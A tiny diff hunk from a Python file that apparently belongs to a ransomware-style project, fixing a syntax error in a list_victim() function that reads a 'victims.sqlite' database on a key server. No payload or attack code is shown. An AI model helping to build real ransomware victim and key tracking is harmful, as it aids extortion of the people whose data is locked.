@@ -6,7 +6,7 @@ DB_FILENAME = '../serveur_cles/data/victims.sqlite'
 
 def list_victim():
     # Connection DB
-    victim_list=_ []
+    victim_list = []
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
 
